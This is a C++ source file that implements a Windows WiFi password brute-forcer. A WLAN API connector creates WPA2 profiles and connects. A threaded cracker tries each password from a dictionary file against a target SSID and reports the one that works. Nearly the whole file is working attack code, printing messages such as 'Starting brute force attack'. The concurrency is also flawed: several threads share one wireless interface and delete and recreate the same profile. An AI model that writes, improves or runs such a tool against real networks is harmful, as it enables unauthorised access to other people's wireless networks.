#include "wifi.h"
#include <iostream>
#include <fstream>
#include <thread>
#include <atomic>
#include <chrono>
#include <mutex>
#include <algorithm>
#include <iomanip>

// Helper function for XML escaping
std::string xmlEscape(const std::string& input) {
    std::string output;
    for (char c : input) {
        switch (c) {
            case '<': output += "&lt;"; break;
            case '>': output += "&gt;"; break;
            case '&': output += "&amp;"; break;
            case '"': output += "&quot;"; break;
            case '\'': output += "&apos;"; break;
            default: output += c; break;
        }
    }
    return output;
}

// WiFiConnector implementation
WiFiConnector::WiFiConnector() : hClient(NULL), pIfList(NULL), isInitialized(false) {
}

WiFiConnector::~WiFiConnector() {
    if (isInitialized) {
        disconnect();
        if (pIfList) {
            WlanFreeMemory(pIfList);
        }
        WlanCloseHandle(hClient, NULL);
    }
}

bool WiFiConnector::initialize() {
    DWORD dwError = WlanOpenHandle(2, NULL, &dwMaxClient, &hClient);
    if (dwError != ERROR_SUCCESS) {
        std::cerr << "Error: WlanOpenHandle failed with error code " << dwError << std::endl;
        return false;
    }

    dwError = WlanEnumInterfaces(hClient, NULL, &pIfList);
    if (dwError != ERROR_SUCCESS) {
        std::cerr << "Error: WlanEnumInterfaces failed with error code " << dwError << std::endl;
        WlanCloseHandle(hClient, NULL);
        return false;
    }

    if (pIfList->dwNumberOfItems == 0) {
        std::cerr << "Error: No wireless interfaces found" << std::endl;
        WlanFreeMemory(pIfList);
        WlanCloseHandle(hClient, NULL);
        return false;
    }

    pIfInfo = &pIfList->InterfaceInfo[0];
    isInitialized = true;
    return true;
}

bool WiFiConnector::connectToNetwork(const std::string& ssid, const std::string& password) {
    if (!isInitialized) {
        if (!initialize()) {
            return false;
        }
    }

    DWORD dwError = 0;
    WLAN_AVAILABLE_NETWORK_LIST* pBssList = NULL;

    dwError = WlanGetAvailableNetworkList(hClient, &pIfInfo->InterfaceGuid, 0, NULL, &pBssList);
    if (dwError != ERROR_SUCCESS) {
        std::cerr << "Error: WlanGetAvailableNetworkList failed with error code " << dwError << std::endl;
        return false;
    }

    // Find the target network
    bool found = false;
    for (DWORD i = 0; i < pBssList->dwNumberOfItems; i++) {
        WLAN_AVAILABLE_NETWORK* pNetwork = &pBssList->Network[i];
        std::string currentSsid((char*)pNetwork->dot11Ssid.ucSSID, pNetwork->dot11Ssid.uSSIDLength);
        if (currentSsid == ssid) {
            found = true;
            break;
        }
    }

    if (!found) {
        std::cerr << "Error: Network " << ssid << " not found" << std::endl;
        WlanFreeMemory(pBssList);
        return false;
    }

    // Create connection parameters
    WLAN_PROFILE_INFO_LIST* pProfileList = NULL;
    dwError = WlanGetProfileList(hClient, &pIfInfo->InterfaceGuid, NULL, &pProfileList);
    if (dwError != ERROR_SUCCESS) {
        std::cerr << "Error: WlanGetProfileList failed with error code " << dwError << std::endl;
        WlanFreeMemory(pBssList);
        return false;
    }

    // Check if profile exists, delete it if it does
    bool profileExists = false;
    for (DWORD i = 0; i < pProfileList->dwNumberOfItems; i++) {
            // Convert WCHAR to std::string
            WCHAR* wProfileName = pProfileList->ProfileInfo[i].strProfileName;
            int len = WideCharToMultiByte(CP_ACP, 0, wProfileName, -1, NULL, 0, NULL, NULL);
            std::string profileName(len, 0);
            WideCharToMultiByte(CP_ACP, 0, wProfileName, -1, &profileName[0], len, NULL, NULL);
            
            if (profileName == ssid) {
                profileExists = true;
                break;
            }
        }

    if (profileExists) {
        // Convert std::string to LPCWSTR
        int len = MultiByteToWideChar(CP_ACP, 0, ssid.c_str(), -1, NULL, 0);
        std::vector<WCHAR> wSsid(len);
        MultiByteToWideChar(CP_ACP, 0, ssid.c_str(), -1, &wSsid[0], len);
        
        dwError = WlanDeleteProfile(hClient, &pIfInfo->InterfaceGuid, &wSsid[0], NULL);
        if (dwError != ERROR_SUCCESS && dwError != ERROR_NOT_FOUND) {
            std::cerr << "Error: WlanDeleteProfile failed with error code " << dwError << std::endl;
            WlanFreeMemory(pProfileList);
            WlanFreeMemory(pBssList);
            return false;
        }
    }

    // Create XML profile using simple string concatenation with proper XML escaping
    std::string profileXml;
    profileXml = "<?xml version=\"1.0\"?>";
    profileXml += "<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">";
    profileXml += "<name>" + xmlEscape(ssid) + "</name>";
    profileXml += "<SSIDConfig>";
    profileXml += "<SSID>";
    profileXml += "<name>" + xmlEscape(ssid) + "</name>";
    profileXml += "</SSID>";
    profileXml += "</SSIDConfig>";
    profileXml += "<connectionType>ESS</connectionType>";
    profileXml += "<connectionMode>auto</connectionMode>";
    profileXml += "<MSM>";
    profileXml += "<security>";
    profileXml += "<authEncryption>";
    profileXml += "<authentication>WPA2PSK</authentication>";
    profileXml += "<encryption>AES</encryption>";
    profileXml += "<useOneX>false</useOneX>";
    profileXml += "</authEncryption>";
    profileXml += "<sharedKey>";
    profileXml += "<keyType>passPhrase</keyType>";
    profileXml += "<protected>false</protected>";
    profileXml += "<keyMaterial>" + xmlEscape(password) + "</keyMaterial>";
    profileXml += "</sharedKey>";
    profileXml += "</security>";
    profileXml += "</MSM>";
    profileXml += "</WLANProfile>";

    // Add profile
    // Convert std::string to LPCWSTR
    int xmlLen = MultiByteToWideChar(CP_ACP, 0, profileXml.c_str(), -1, NULL, 0);
    std::vector<WCHAR> wProfileXml(xmlLen);
    MultiByteToWideChar(CP_ACP, 0, profileXml.c_str(), -1, &wProfileXml[0], xmlLen);
    
    dwError = WlanSetProfile(hClient, &pIfInfo->InterfaceGuid, 0, &wProfileXml[0], NULL, true, NULL, NULL);
    if (dwError != ERROR_SUCCESS) {
        std::cerr << "Error: WlanSetProfile failed with error code " << dwError << std::endl;
        WlanFreeMemory(pProfileList);
        WlanFreeMemory(pBssList);
        return false;
    }

    // Connect to the network
    WLAN_CONNECTION_PARAMETERS connParams;
    connParams.wlanConnectionMode = wlan_connection_mode_profile;
    
    // Convert std::string to PWSTR for strProfile
    int ssidLen = MultiByteToWideChar(CP_ACP, 0, ssid.c_str(), -1, NULL, 0);
    std::vector<WCHAR> wSsid(ssidLen);
    MultiByteToWideChar(CP_ACP, 0, ssid.c_str(), -1, &wSsid[0], ssidLen);
    connParams.strProfile = &wSsid[0];
    
    connParams.pDot11Ssid = NULL;
    connParams.pDesiredBssidList = NULL;
    connParams.dot11BssType = dot11_BSS_type_infrastructure;
    connParams.dwFlags = 0;

    dwError = WlanConnect(hClient, &pIfInfo->InterfaceGuid, &connParams, NULL);
    if (dwError != ERROR_SUCCESS) {
        std::cerr << "Error: WlanConnect failed with error code " << dwError << std::endl;
        WlanFreeMemory(pProfileList);
        WlanFreeMemory(pBssList);
        return false;
    }

    // Wait for connection
    std::this_thread::sleep_for(std::chrono::seconds(2));

    // Check connection status
    WLAN_CONNECTION_ATTRIBUTES* connAttr = NULL;
    DWORD dwDataSize = 0;
    WLAN_OPCODE_VALUE_TYPE opCodeType;
    
    dwError = WlanQueryInterface(hClient, &pIfInfo->InterfaceGuid, 
                               wlan_intf_opcode_current_connection, NULL, 
                               &dwDataSize, (void**)&connAttr, &opCodeType);
    
    bool connected = false;
    if (dwError == ERROR_SUCCESS) {
        connected = (connAttr->isState == wlan_interface_state_connected);
    }
    
    // Always free the memory allocated by WlanQueryInterface
    if (connAttr) {
        WlanFreeMemory(connAttr);
    }

    WlanFreeMemory(pProfileList);
    WlanFreeMemory(pBssList);

    return connected;
}

bool WiFiConnector::disconnect() {
    if (!isInitialized) {
        return false;
    }

    DWORD dwError = WlanDisconnect(hClient, &pIfInfo->InterfaceGuid, NULL);
    if (dwError != ERROR_SUCCESS && dwError != ERROR_NOT_FOUND) {
        std::cerr << "Error: WlanDisconnect failed with error code " << dwError << std::endl;
        return false;
    }

    return true;
}

std::vector<std::string> WiFiConnector::getAvailableNetworks() {
    std::vector<std::string> networks;
    if (!isInitialized) {
        if (!initialize()) {
            return networks;
        }
    }

    WLAN_AVAILABLE_NETWORK_LIST* pBssList = NULL;
    DWORD dwError = WlanGetAvailableNetworkList(hClient, &pIfInfo->InterfaceGuid, 0, NULL, &pBssList);
    if (dwError != ERROR_SUCCESS) {
        std::cerr << "Error: WlanGetAvailableNetworkList failed with error code " << dwError << std::endl;
        return networks;
    }

    for (DWORD i = 0; i < pBssList->dwNumberOfItems; i++) {
        WLAN_AVAILABLE_NETWORK* pNetwork = &pBssList->Network[i];
        std::string ssid((char*)pNetwork->dot11Ssid.ucSSID, pNetwork->dot11Ssid.uSSIDLength);
        if (!ssid.empty()) {
            networks.push_back(ssid);
        }
    }

    WlanFreeMemory(pBssList);
    return networks;
}

bool WiFiConnector::isConnected() const {
    if (!isInitialized) {
        return false;
    }

    WLAN_INTERFACE_STATE* state = NULL;
    DWORD dwDataSize = 0;
    WLAN_OPCODE_VALUE_TYPE opCodeType;
    
    DWORD dwError = WlanQueryInterface(hClient, &pIfInfo->InterfaceGuid, 
                                      wlan_intf_opcode_interface_state, NULL, 
                                      &dwDataSize, (void**)&state, &opCodeType);
    
    bool connected = false;
    if (dwError == ERROR_SUCCESS) {
        connected = (*state == wlan_interface_state_connected);
    }
    
    // Always free the memory allocated by WlanQueryInterface
    if (state) {
        WlanFreeMemory(state);
    }
    
    return connected;
}

std::string WiFiConnector::getCurrentSSID() const {
    if (!isConnected()) {
        return "";
    }

    WLAN_CONNECTION_ATTRIBUTES* connAttr = NULL;
    DWORD dwDataSize = 0;
    WLAN_OPCODE_VALUE_TYPE opCodeType;
    
    DWORD dwError = WlanQueryInterface(hClient, &pIfInfo->InterfaceGuid, 
                                      wlan_intf_opcode_current_connection, NULL, 
                                      &dwDataSize, (void**)&connAttr, &opCodeType);
    
    std::string ssid;
    if (dwError == ERROR_SUCCESS) {
        // Extract SSID from connection attributes
        ssid = std::string((char*)connAttr->wlanAssociationAttributes.dot11Ssid.ucSSID, 
                          connAttr->wlanAssociationAttributes.dot11Ssid.uSSIDLength);
    }
    
    // Always free the memory allocated by WlanQueryInterface
    if (connAttr) {
        WlanFreeMemory(connAttr);
    }
    
    return ssid;
}

// WiFiBruteForcer implementation
WiFiBruteForcer::WiFiBruteForcer(const std::string& ssid, const std::string& dictPath, int timeout, int threads)
    : targetSSID(ssid), dictionaryPath(dictPath), timeout(timeout), threadCount(threads),
      foundPassword(false), correctPassword("") {
}

bool WiFiBruteForcer::start() {
    // Load dictionary
    std::vector<std::string> passwords;
    
    // Path validation: check if dictionary path contains directory traversal
    if (dictionaryPath.find("..") != std::string::npos || 
        dictionaryPath.find(":") != std::string::npos) {
        std::cerr << "Error: Directory traversal or absolute paths not allowed for dictionary" << std::endl;
        return false;
    }
    
    // Check if file exists and has read permission
    std::ifstream dictFile(dictionaryPath);
    if (!dictFile.is_open()) {
        std::cerr << "Error: Could not open dictionary file: " << dictionaryPath << std::endl;
        std::cerr << "Please check if the file exists and you have read permission" << std::endl;
        return false;
    }

    std::string password;
    while (std::getline(dictFile, password)) {
        // Remove whitespace
        password.erase(std::remove_if(password.begin(), password.end(), ::isspace), password.end());
        if (!password.empty()) {
            passwords.push_back(password);
        }
    }
    dictFile.close();

    if (passwords.empty()) {
        std::cerr << "Error: Dictionary file is empty" << std::endl;
        return false;
    }

    std::cout << "Loaded " << passwords.size() << " passwords from dictionary" << std::endl;
    std::cout << "Target SSID: " << targetSSID << std::endl;
    std::cout << "Starting brute force attack with " << threadCount << " threads..." << std::endl;
    std::cout << "====================================" << std::endl;

    // Create threads
    std::vector<std::thread> threads;
    int passwordsPerThread = passwords.size() / threadCount;
    int remainder = passwords.size() % threadCount;
    int start = 0;

    for (int i = 0; i < threadCount; i++) {
        int end = start + passwordsPerThread + (i < remainder ? 1 : 0);
        threads.emplace_back(&WiFiBruteForcer::bruteForceThread, this, passwords, start, end);
        start = end;
    }

    // Wait for all threads to finish
    for (auto& thread : threads) {
        if (thread.joinable()) {
            thread.join();
        }
    }

    std::cout << "\n====================================" << std::endl;
    if (foundPassword) {
        std::cout << "SUCCESS! Found password: " << correctPassword << std::endl;
        
        // Ask user if they want to save the result
        char saveChoice;
        std::cout << "Do you want to save the result to a file? (y/n): ";
        std::cin >> saveChoice;
        
        if (saveChoice == 'y' || saveChoice == 'Y') {
            // Simple XOR encryption for demonstration purposes
            const char key = 'K'; // Encryption key
            std::string encryptedSSID = targetSSID;
            std::string encryptedPassword = correctPassword;
            
            // Encrypt SSID
            for (char& c : encryptedSSID) {
                c ^= key;
            }
            
            // Encrypt password
            for (char& c : encryptedPassword) {
                c ^= key;
            }
            
            // Save encrypted result to file
            std::ofstream resultFile("wifi_brute_result.txt");
            if (resultFile.is_open()) {
                resultFile << "ENCRYPTED: YES\n";
                resultFile << "SSID: " << encryptedSSID << std::endl;
                resultFile << "Password: " << encryptedPassword << std::endl;
                resultFile << "Found on: " << __DATE__ << " " << __TIME__ << std::endl;
                resultFile << "NOTE: Use the same tool to decrypt this file." << std::endl;
                resultFile.close();
                std::cout << "Encrypted result saved to wifi_brute_result.txt" << std::endl;
                std::cout << "Warning: This is a simple encryption for demonstration only." << std::endl;
            }
        } else {
            std::cout << "Result not saved to file." << std::endl;
        }
    } else {
        std::cout << "FAILED! Password not found in dictionary" << std::endl;
    }

    return foundPassword;
}

void WiFiBruteForcer::stop() {
    foundPassword = true;
}

std::string WiFiBruteForcer::getFoundPassword() const {
    return correctPassword;
}

bool WiFiBruteForcer::isPasswordFound() const {
    return foundPassword;
}

void WiFiBruteForcer::bruteForceThread(const std::vector<std::string>& passwords, int start, int end) {
    int tested = 0;
    int total = end - start;

    for (int i = start; i < end && !foundPassword; i++) {
        if (testPassword(passwords[i])) {
            // Use mutex to protect correctPassword assignment
            std::lock_guard<std::mutex> lock(passwordMutex);
            correctPassword = passwords[i];
            foundPassword = true;
            break;
        }
        tested++;
        if (tested % 10 == 0) {
            displayProgress(tested, total);
        }
    }
}

bool WiFiBruteForcer::testPassword(const std::string& password) {
    // Validate password length (WPA/WPA2 requires 8-63 characters)
    if (password.length() < 8 || password.length() > 63) {
        return false; // Skip passwords that don't meet WPA/WPA2 requirements
    }
    
    WiFiConnector connector;
    if (!connector.initialize()) {
        return false;
    }

    // Connect to network
    bool connected = connector.connectToNetwork(targetSSID, password);
    if (connected) {
        std::cout << "\nPassword found: " << password << std::endl;
        connector.disconnect();
        return true;
    }

    // Disconnect if still connected
    connector.disconnect();
    return false;
}

void WiFiBruteForcer::displayProgress(int tested, int total) {
    static std::mutex mtx;
    std::lock_guard<std::mutex> lock(mtx);
    
    double progress = static_cast<double>(tested) / total * 100;
    std::cout << "\rProgress: " << std::fixed << std::setprecision(2) << progress << "%";
    std::cout.flush();
}
